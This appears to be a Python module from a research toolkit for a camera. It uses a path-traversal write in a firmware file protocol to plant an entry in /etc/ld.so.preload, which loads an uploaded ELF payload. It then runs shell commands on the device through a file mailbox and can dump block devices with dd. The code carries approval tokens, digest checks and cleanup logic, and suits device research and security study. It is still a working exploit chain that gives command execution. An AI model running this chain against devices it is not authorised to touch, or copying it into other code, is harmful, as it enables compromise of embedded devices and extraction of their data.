"""Preload deployment for a one-shot payload.

This is the only module that arms a privileged loading decision. It refuses to
run without an explicit approval token, verifies the artifact on the device
before arming, and always attempts a disarm if anything fails afterwards.

Fixed order:
  1. upload the payload object into the Work area and read it back byte-exact
  2. arm the preload file, then read it back and compare
  3. send exactly one DEBUG request
  4. prove the payload ran: its first action is to remove the preload file
  5. for the shell payload, drive the mailbox once and read the output back
  6. if the preload file is still present, overwrite it with a newline

Every request used here is registered with the transport allowlist first; the
previous version polled a path it had not authorized, which aborted the run
before the cleanup block could execute.
"""
import hashlib
from pathlib import Path
import struct
import time

from jiritsu_version_read import (ARTIFACT_MAX_BYTES, JiritsuResultError, authorize,
                                  authorize_debug, authorize_mailbox_channel, exchange)

OBJECT_PATH = "/tmp/jiritsu/a7c2-payload.so"
PRELOAD_WIRE_PATH = "/tmp/jiritsu/../../etc/ld.so.preload"
PRELOAD_PATH = "/etc/ld.so.preload"
PRELOAD_ENTRY = OBJECT_PATH + "\n"
# Whitespace-only, and longer than any entry this module can write: glibc splits
# the preload file on whitespace, so this contributes zero libraries whether or
# not the firmware truncates on overwrite (verified writes only ever created new
# files, so overwrite semantics are unproven).
NEUTRAL_CONTENT = b"\n" * 512
RESULT_PATH = "/tmp/jiritsu/a7c2-probe-result.bin"
CMD_PATH = "/tmp/jiritsu/a7c2-cmd.txt"
CHUNK_PATH = "/tmp/jiritsu/a7c2-chunk.bin"
OUT_PATH = "/tmp/jiritsu/a7c2-out.txt"
SHELL_PROBE_COMMAND = "id; cat /proc/mounts"
SHELL_EXIT_TOKEN = "__a7c2_exit__"
RESULT_MAX_BYTES = 0x20000
RETRY_DELAY_SECONDS = 0.5
READ_ATTEMPTS = 8
COMMAND_ATTEMPTS = 240        # 120 s at the 0.5 s poll interval, for slow dd+sync
ABSENT_RESULT = 0x10000006
APPROVAL_TOKEN = "arm-preload-once"
PAYLOAD_KINDS = ("shell", "probe")


def _select(path):
    if not path.startswith("/tmp/jiritsu/"):
        raise ValueError("Deployment paths must start with the Work area")
    if any(ord(character) < 0x20 or ord(character) > 0x7e or character in "\r\n," for character in path):
        raise ValueError("Deployment path contains a rejected character")
    return struct.pack("<HH", 0x1001, 0x0f) + b"\0" + path.encode("ascii") + b"\0"


def _write(path, data):
    if not isinstance(data, bytes):
        raise ValueError("Deployment payload must be bytes")
    if len(data) > ARTIFACT_MAX_BYTES:
        raise ValueError("Deployment payload exceeds the firmware file-write limit")
    return struct.pack("<HH", 0x1001, 0x10) + b"\x00\xff\x00" + data


_READ = struct.pack("<HH", 0x1001, 0x11) + b"\x00\xff\x00"


def build_requests(payload_object, command=SHELL_PROBE_COMMAND):
    if not isinstance(payload_object, bytes) or not payload_object.startswith(b"\x7fELF"):
        raise ValueError("Payload must be an ELF shared object")
    if not command:
        raise ValueError("Probe command must not be empty")
    return {
        "select_object": _select(OBJECT_PATH),
        "upload": _write(OBJECT_PATH, payload_object),
        "select_preload": _select(PRELOAD_WIRE_PATH),
        "arm": _write(PRELOAD_WIRE_PATH, PRELOAD_ENTRY.encode("ascii")),
        "disarm": _write(PRELOAD_WIRE_PATH, NEUTRAL_CONTENT),
        "select_result": _select(RESULT_PATH),
        "select_command": _select(CMD_PATH),
        "write_command": _write(CMD_PATH, (command + "\n").encode("utf-8")),
        "write_exit": _write(CMD_PATH, (SHELL_EXIT_TOKEN + "\n").encode("ascii")),
        "select_output": _select(OUT_PATH),
        "select_chunk": _select(CHUNK_PATH),
        "read": _READ,
    }


def build_mailbox_command(nonce, probe_command=SHELL_PROBE_COMMAND):
    """Prefix the probe with a per-run nonce so a stale output cannot look fresh."""
    if not nonce or not nonce.isalnum():
        raise ValueError("nonce must be a non-empty alphanumeric string")
    return f"echo A7C2-{nonce}; {probe_command}"


def _read_or_absent(transport, log):
    try:
        return exchange(transport, _READ, 4 + RESULT_MAX_BYTES, log)
    except JiritsuResultError as error:
        if error.result == ABSENT_RESULT:
            return None
        raise


def _read_path(transport, select_request, log):
    exchange(transport, select_request, 4, log)
    return _read_or_absent(transport, log)


def _wait_for(transport, select_request, predicate, log, label, attempts=READ_ATTEMPTS):
    """Poll until the predicate holds; return (found, value).

    Returning a bare value would conflate "the predicate matched an absent file"
    with "timed out", which previously made a payload that never ran look
    successful.
    """
    for attempt in range(1, attempts + 1):
        value = _read_path(transport, select_request, log)
        if predicate(value):
            log(f"{label}_seen", attempt=attempt, value=None if value is None else len(value))
            return True, value
        log(f"{label}_pending", attempt=attempt)
        time.sleep(RETRY_DELAY_SECONDS)
    return False, None


def deploy_and_run(transport, payload_object, log, approval=None, payload_kind="shell",
                   expected_sha256=None, nonce=None, stop_worker=True,
                   probe_command=SHELL_PROBE_COMMAND, driver=None):
    if approval != APPROVAL_TOKEN:
        raise PermissionError("Preload deployment requires explicit approval for this run")
    if payload_kind not in PAYLOAD_KINDS:
        raise ValueError(f"payload_kind must be one of {PAYLOAD_KINDS}")
    if not expected_sha256:
        raise ValueError("expected_sha256 is required: state which artifact is intended")
    digest = hashlib.sha256(payload_object).hexdigest()
    if digest != expected_sha256:
        raise ValueError(
            f"Artifact does not match the pinned digest: {digest[:16]}… vs {expected_sha256[:16]}…"
        )
    if payload_kind == "shell" and driver is None and not nonce:
        raise ValueError("nonce is required for the shell payload (stale-output guard)")

    if payload_kind == "shell" and driver is None:
        command = build_mailbox_command(nonce, probe_command)
    else:
        # A driver submits its own enveloped commands; the placeholder request is
        # built but never sent.
        command = SHELL_PROBE_COMMAND
    requests = build_requests(payload_object, command=command)
    # Neutralise any mailbox state left by an earlier run before arming, so a
    # stale command cannot be consumed by a worker that is still alive and a
    # stale reply cannot be mistaken for this run's.
    requests["seed_command"] = _write(CMD_PATH, b"\n")
    requests["seed_output"] = _write(OUT_PATH, b"A7C2-OUT-1\nSTALE\n")
    authorize(transport, tuple(requests.values()), max_bytes=ARTIFACT_MAX_BYTES,
              max_requests=len(requests) + 8)
    authorize_debug(transport)
    if driver is not None:
        # the driver submits many commands; each still has to carry the envelope
        authorize_mailbox_channel(transport)

    # 1. upload and prove it landed intact (nothing is armed yet)
    exchange(transport, requests["select_object"], 4, log)
    exchange(transport, requests["upload"], 4, log)
    stored = _read_path(transport, requests["select_object"], log)
    if stored != payload_object:
        raise ValueError(
            f"Uploaded artifact does not read back intact: sent {len(payload_object)} bytes, "
            f"read {None if stored is None else len(stored)}"
        )
    log("payload_verified_on_device", path=OBJECT_PATH, bytes=len(stored), sha256=digest)

    # Never clobber pre-existing loader configuration we did not write.
    try:
        existing = _read_path(transport, requests["select_preload"], log)
    except Exception as guard_error:                     # noqa: BLE001
        raise ValueError(
            "Cannot read the current preload state, refusing to arm: "
            f"{type(guard_error).__name__}: {guard_error}"
        ) from guard_error
    log("preload_before_arm", present=existing is not None,
        state="absent" if existing is None else existing.hex())
    # Neutral means "contributes no libraries": glibc splits the preload file on
    # whitespace, so an absent, empty, or whitespace-only file loads nothing. Only
    # content that actually names objects is foreign and worth refusing over — a
    # 0-byte file was wrongly treated as foreign, which blocked a recovery run.
    if existing is not None and existing.strip() != b"" and existing != NEUTRAL_CONTENT:
        raise ValueError(
            "Refusing to arm: /etc/ld.so.preload already holds content that names objects "
            f"({len(existing)} bytes). Inspect it before overwriting."
        )

    record = {
        "debug_sent": False,
        "payload_sha256": digest,
        "payload_bytes": len(payload_object),
        "payload_kind": payload_kind,
        "nonce": nonce,
        "armed": False,
        "payload_ran": False,
        "mailbox_ok": None,
        "disarmed": None,
        "preload_state_after": None,
        "result_bytes": None,
        "output_bytes": None,
    }

    for seed in ("seed_command", "seed_output"):
        exchange(transport, requests["select_command" if seed == "seed_command" else "select_output"],
                 4, log)
        exchange(transport, requests[seed], 4, log)
    log("mailbox_seeded")

    # Everything from the first write of the preload entry onward must still try
    # to disarm, including the read-back that verifies the entry. The body cannot
    # return directly: success is only granted once neutralisation is verified.
    outcome = None
    error = None
    try:
        # 2. arm and prove the entry is readable
        exchange(transport, requests["select_preload"], 4, log)
        exchange(transport, requests["arm"], 4, log)
        armed = _read_path(transport, requests["select_preload"], log)
        if armed != PRELOAD_ENTRY.encode("ascii"):
            raise ValueError(f"Preload readback mismatch: {armed!r}")
        record["armed"] = True
        log("preload_armed", path=PRELOAD_PATH, entry=PRELOAD_ENTRY.strip())

        exchange(transport, _DEBUG, 4, log)
        record["debug_sent"] = True
        log("debug_request_sent")

        # Informational only, and deliberately unable to affect the outcome:
        # "stat failed" is not proof the entry is gone, and a read error here must
        # not abort a run whose real proof is the mailbox reply below.
        try:
            cleared, _ = _wait_for(transport, requests["select_preload"],
                                   lambda value: value is None, log, "preload_cleared")
            record["preload_cleared_signal"] = cleared
        except Exception as read_error:                  # noqa: BLE001
            record["preload_cleared_signal"] = "unreadable"
            log("preload_cleared_signal_unreadable",
                error=f"{type(read_error).__name__}: {read_error}")

        if payload_kind == "probe":
            # The probe writes a result record: content is the positive proof.
            found_result, result = _wait_for(transport, requests["select_result"],
                                            lambda value: bool(value), log, "probe_result")
            record["result_bytes"] = None if result is None else len(result)
            if not found_result:
                raise ValueError("Probe produced no result record")
            record["payload_ran"] = True
            outcome = (result, record)
        elif driver is not None:
            # A driver submits its own commands, so no single reply carries the
            # nonce; returning without raising means its commands produced output,
            # which is what proves the payload executed.
            result = driver(transport, requests, log, record)
            record["payload_ran"] = True
            record["mailbox_ok"] = True
            outcome = (result, record)
        else:
            # A reply echoing this run's nonce proves a worker executed it, which
            # is stronger than the preload file having disappeared.
            outcome = _run_mailbox(transport, requests, command, nonce, log, record)
    except BaseException as caught:                      # noqa: BLE001
        error = caught
    finally:
        # Always emit the record: it is what tells the operator whether the
        # loader was left armed and whether the clear tool is needed.
        if stop_worker and record["debug_sent"]:
            _stop_worker(transport, requests, log, record)
        record["disarmed"] = _confirm_or_disarm(transport, requests, log, record)
        log("deployment_record", **record)

    return _finish(record, error, outcome)


_UNKNOWN = object()


def submit_command(transport, requests, command, marker, log, attempts=READ_ATTEMPTS):
    """Send one enveloped command and return the output carrying its marker.

    The worker writes its output only after the command finishes, so callers
    running slow commands (a multi-megabyte dd) must raise `attempts`.
    """
    # UTF-8, not ASCII: a camera-side command may legitimately contain non-ASCII
    # text, and an ASCII encode fails before the payload is ever contacted — which
    # reads as "the payload did not run". /bin/sh treats it as bytes either way.
    payload = f"echo A7C2-{marker}; {command}\n".encode("utf-8")
    request = struct.pack("<HH", 0x1001, 0x10) + b"\x00\xff\x00" + payload
    exchange(transport, requests["select_command"], 4, log)
    exchange(transport, request, 4, log)
    token = f"A7C2-{marker}".encode("ascii")
    found, output = _wait_for(
        transport, requests["select_output"],
        lambda value: bool(value) and token in value and b"A7C2-END" in value,
        log, "command_output", attempts=attempts)
    if not found:
        raise ValueError(f"command {marker} produced no matching output")
    return output


def _parse_digest(output):
    """Return the first 32- or 64-hex-digit field in the output, or None.

    The camera's busybox has no sha256sum applet, so dump commands use
    `busybox md5sum`; a 32-digit value is therefore expected and the host
    recomputes with the matching algorithm.
    """
    for line in output.splitlines():
        fields = line.split()
        if not fields:
            continue
        candidate = fields[0]
        if len(candidate) not in (32, 64):
            continue
        try:
            int(candidate, 16)
        except ValueError:
            continue
        return candidate.decode("ascii") if isinstance(candidate, bytes) else candidate
    return None


def partition_dump_driver(device, size, out_dir, chunk_bytes, chunk_path=CHUNK_PATH):
    """Build a driver that copies one block device to the host in verified chunks.

    Every chunk is hashed on the camera and again on the host; a mismatch stops the
    dump instead of writing unverified bytes into the image.

    LEGACY. This holds `chunk_bytes` (1 MiB by default) on the camera's 12 MiB vfat
    partition while each chunk is transferred — the pattern that filled that partition
    once and broke unrelated writes, including the one that neutralises
    /etc/ld.so.preload. Prefer `--dump-to-card` (`jiritsu_card_dump`): the data goes
    straight to the SD card's ext2 partition and only kilobytes stay on the camera.
    Kept for reproducing earlier results.
    """
    def driver(transport, requests, log, record):
        target = Path(out_dir) / f"{device}.img"
        received = 0
        verified = 0
        with target.open("wb") as sink:
            for index, offset in enumerate(range(0, size, chunk_bytes)):
                length = min(chunk_bytes, size - offset)
                command = (f"dd if=/dev/{device} bs=512 skip={offset // 512} "
                           f"count={length // 512} of={chunk_path} 2>&1; sync; "
                           f"busybox md5sum {chunk_path} 2>&1")
                output = submit_command(transport, requests, command, f"d{index:04d}", log,
                                        attempts=COMMAND_ATTEMPTS)
                remote = _parse_digest(output)
                chunk = _read_path(transport, requests["select_chunk"], log)
                if chunk is None or len(chunk) != length:
                    raise ValueError(
                        f"chunk {index} of {device}: expected {length} bytes, "
                        f"read {None if chunk is None else len(chunk)}")
                local = (hashlib.md5(chunk).hexdigest() if remote is not None
                         and len(remote) == 32 else hashlib.sha256(chunk).hexdigest())
                if remote is None or remote != local:
                    raise ValueError(
                        f"chunk {index} of {device}: camera sha256 {remote} != host {local}")
                sink.write(chunk)
                sink.flush()
                received += len(chunk)
                verified += 1
                log("chunk_verified", device=device, index=index, offset=offset,
                    bytes=len(chunk), sha256=local)
                submit_command(transport, requests, f"rm -f {chunk_path}", f"r{index:04d}", log,
                               attempts=COMMAND_ATTEMPTS)
        summary = {"device": device, "bytes": received, "verified_chunks": verified,
                   "image": str(target)}
        record["dump"] = summary
        log("dump_complete", **summary)
        return summary
    return driver


def _run_mailbox(transport, requests, command, nonce, log, record):
    """Submit one command and require this run's nonce back in the reply."""
    exchange(transport, requests["select_command"], 4, log)
    exchange(transport, requests["write_command"], 4, log)
    log("mailbox_command_submitted", command=command)
    marker = f"A7C2-{nonce}".encode("ascii")
    found, output = _wait_for(
        transport, requests["select_output"],
        lambda value: bool(value) and marker in value and b"A7C2-END" in value,
        log, "mailbox_output")
    record["mailbox_ok"] = found
    record["output_bytes"] = None if output is None else len(output)
    if not found:
        raise ValueError("Payload did not run: the mailbox never returned this run's nonce")
    record["payload_ran"] = True
    return output, record


def _finish(record, error, outcome):
    """Grant success only when the preload entry is proven neutral.

    A cleanup failure must not be reported as a normal return: the caller would
    treat the device as safe while the loader could still be armed. The original
    error, when there is one, stays chained so it is not lost.
    """
    if not record.get("disarmed"):
        recovery = PreloadRecoveryRequired(
            "Could not verify that /etc/ld.so.preload is neutral"
            f" (state={record.get('preload_state_after')!r})."
            " Run analysis/jiritsu_preload_clear.py before further work."
        )
        record["recovery_required"] = True
        raise recovery from error
    if error is not None:
        raise error
    return outcome


class PreloadRecoveryRequired(RuntimeError):
    """Raised when the run cannot prove the loader preload entry is harmless.

    A caller must not treat this as an ordinary failure: the device may still be
    armed, so the standalone clear tool has to be run against it.
    """



def _confirm_or_disarm(transport, requests, log, record):
    """Neutralise the preload entry and confirm it by reading the content back.

    The write is unconditional and idempotent, and `disarmed` becomes True only
    when a read returns exactly NEUTRAL_CONTENT. "The file could not be read" and
    "the file is absent" are both treated as unconfirmed: the result code for a
    failed stat does not prove absence, and this record is what tells the operator
    whether to run the standalone clear tool. Never raises, so it cannot mask the
    error that triggered the cleanup.
    """
    state = _UNKNOWN
    try:
        exchange(transport, requests["select_preload"], 4, log)
        exchange(transport, requests["disarm"], 4, log)
        state = _read_path(transport, requests["select_preload"], log)
    except Exception as stop_error:                           # noqa: BLE001
        log("preload_cleanup_failed", error=f"{type(stop_error).__name__}: {stop_error}")
        state = _UNKNOWN

    confirmed = state == NEUTRAL_CONTENT
    record["disarm_method"] = "content-verified"
    record["preload_state_after"] = (
        None if state is _UNKNOWN or state is None else state.hex()
    )
    if confirmed:
        log("preload_neutralised", bytes=len(NEUTRAL_CONTENT))
    else:
        log("manual_clear_required", tool="analysis/jiritsu_preload_clear.py",
            state="unreadable" if state is _UNKNOWN else
                  ("absent" if state is None else state.hex()))
    return confirmed


def _stop_worker(transport, requests, log, record):
    """Ask the worker to exit and confirm it stopped by its output disappearing."""
    try:
        exchange(transport, requests["select_command"], 4, log)
        exchange(transport, requests["write_exit"], 4, log)
        log("worker_exit_submitted", token=SHELL_EXIT_TOKEN)
        stopped, _ = _wait_for(transport, requests["select_output"],
                               lambda value: value is None, log, "worker_output_removed")
        record["worker_stopped"] = stopped
    except Exception as stop_error:                           # noqa: BLE001
        record["worker_stopped"] = False
        log("worker_stop_failed", error=f"{type(stop_error).__name__}: {stop_error}")
    if not record.get("worker_stopped"):
        log("worker_may_still_be_running", hint="it keeps polling until reboot")


_DEBUG = struct.pack("<HH", 0x1001, 5) + b"\x00\x00\x00"
